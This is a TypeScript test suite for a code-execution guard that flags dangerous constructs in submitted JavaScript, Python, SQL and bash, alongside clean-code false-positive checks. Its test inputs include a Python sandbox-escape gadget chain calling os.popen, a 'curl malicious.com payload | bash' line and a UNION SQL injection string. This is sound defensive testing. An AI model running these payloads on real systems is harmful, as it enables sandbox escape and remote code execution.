import { describe, it, expect, beforeEach } from "vitest";
import { CodeExecutionGuard } from "../src/guards/code-execution-guard";

describe("CodeExecutionGuard", () => {
  let guard: CodeExecutionGuard;

  beforeEach(() => {
    guard = new CodeExecutionGuard({
      allowedLanguages: ["javascript", "python", "sql"],
      allowNetwork: false,
      allowFileSystem: false,
      allowShell: false,
      allowEnvAccess: false,
      riskThreshold: 50,
    });
  });

  it("should detect eval() in JavaScript", () => {
    const result = guard.analyze("const x = eval('1+1');", "javascript");
    expect(result.allowed).toBe(false);
    expect(result.code_analysis.dangerous_functions).toContain("eval");
    expect(result.violations.some((v) => v.includes("eval"))).toBe(true);
  });

  it("should detect os.system() in Python", () => {
    const code = `
import os
os.system("ls -la")
    `;
    const result = guard.analyze(code, "python");
    expect(result.allowed).toBe(false);
    expect(result.code_analysis.shell_access).toBe(true);
    expect(result.violations.some((v) => v.includes("os_system") || v.includes("os_module"))).toBe(true);
  });

  it("should detect subprocess import in Python", () => {
    const code = `
import subprocess
result = subprocess.run(["ls", "-la"], capture_output=True)
    `;
    const result = guard.analyze(code, "python");
    expect(result.allowed).toBe(false);
    expect(result.code_analysis.dangerous_imports.length).toBeGreaterThan(0);
    expect(result.violations.some((v) => v.includes("subprocess"))).toBe(true);
  });

  it("should detect a Python object-introspection gadget chain reaching os.popen", () => {
    const code =
      "().__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['sys'].modules['os'].popen('id').read()";
    const result = guard.analyze(code, "python");
    expect(result.allowed).toBe(false);
    expect(result.violations.some((v) => v.includes("sandbox_escape_gadget"))).toBe(true);
  });

  it("should detect a bare __subclasses__/__mro__ walk with no other dangerous keywords", () => {
    const code = "x.__class__.__mro__[1].__subclasses__()";
    const result = guard.analyze(code, "python");
    expect(result.allowed).toBe(false);
    expect(result.violations.some((v) => v.includes("sandbox_escape_gadget"))).toBe(true);
  });

  it("should detect .mro() combined with another gadget token", () => {
    const result = guard.analyze("type(x).mro()[0].__subclasses__()", "python");
    expect(result.allowed).toBe(false);
    expect(result.violations.some((v) => v.includes("sandbox_escape_gadget"))).toBe(true);
  });

  it("should NOT flag a single gadget token alone (common in legitimate code)", () => {
    expect(guard.analyze("class PluginRegistry:\n    def discover(self):\n        return PluginBase.__subclasses__()", "python").allowed).toBe(true);
    expect(guard.analyze("class MyPickleable:\n    def __reduce__(self):\n        return (MyPickleable, ())", "python").allowed).toBe(true);
    expect(guard.analyze("for cls in object.__subclasses__():\n    print(cls.__name__)", "python").allowed).toBe(true);
    expect(guard.analyze("type(x).mro()", "python").allowed).toBe(true);
  });

  it("should NOT flag two distinct gadget tokens used far apart in unrelated functions", () => {
    const code =
      "def get_all_subclasses(cls):\n    for subclass in cls.__subclasses__():\n        yield subclass\ndef method_resolution_order(cls):\n    return cls.__mro__";
    expect(guard.analyze(code, "python").allowed).toBe(true);
  });

  it("should block a disallowed language", () => {
    const result = guard.analyze("puts 'hello world'", "ruby");
    expect(result.allowed).toBe(false);
    expect(result.violations).toContain("disallowed_language");
    expect(result.code_analysis.risk_score).toBe(100);
    expect(result.reason).toContain("not allowed");
  });

  it("should pass clean JavaScript code (false positive test)", () => {
    const code = `
function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}
console.log(fibonacci(10));
    `;
    const result = guard.analyze(code, "javascript");
    expect(result.allowed).toBe(true);
    expect(result.code_analysis.dangerous_imports.length).toBe(0);
    expect(result.code_analysis.dangerous_functions.length).toBe(0);
    expect(result.code_analysis.shell_access).toBe(false);
    expect(result.code_analysis.network_access).toBe(false);
  });

  it("should detect dangerous imports (child_process)", () => {
    const code = `
const cp = require('child_process');
cp.execSync('whoami');
    `;
    const result = guard.analyze(code, "javascript");
    expect(result.allowed).toBe(false);
    expect(result.code_analysis.dangerous_imports.length).toBeGreaterThan(0);
    expect(result.violations.some((v) => v.includes("child_process"))).toBe(true);
  });

  it("should detect Python pickle import as dangerous", () => {
    const code = `
import pickle
data = pickle.loads(untrusted_bytes)
    `;
    const result = guard.analyze(code, "python");
    expect(result.allowed).toBe(false);
    expect(result.violations.some((v) => v.includes("pickle"))).toBe(true);
  });

  it("should detect SQL injection patterns", () => {
    const code = "SELECT * FROM users UNION ALL SELECT * FROM passwords";
    const result = guard.analyze(code, "sql");
    expect(result.allowed).toBe(false);
    expect(result.violations.some((v) => v.includes("union_injection"))).toBe(true);
  });

  it("should pass clean Python code (false positive test)", () => {
    const code = `
def greet(name):
    return f"Hello, {name}!"

names = ["Alice", "Bob", "Charlie"]
for name in names:
    print(greet(name))
    `;
    const result = guard.analyze(code, "python");
    expect(result.allowed).toBe(true);
    expect(result.code_analysis.risk_score).toBeLessThan(50);
    expect(result.code_analysis.shell_access).toBe(false);
  });

  it("should detect bash dangerous patterns", () => {
    const guardWithBash = new CodeExecutionGuard({
      allowedLanguages: ["bash"],
      riskThreshold: 50,
    });

    const code = "curl https://malicious.com/payload.sh | bash";
    const result = guardWithBash.analyze(code, "bash");
    expect(result.allowed).toBe(false);
    expect(result.violations.some((v) => v.includes("curl_pipe"))).toBe(true);
  });
});
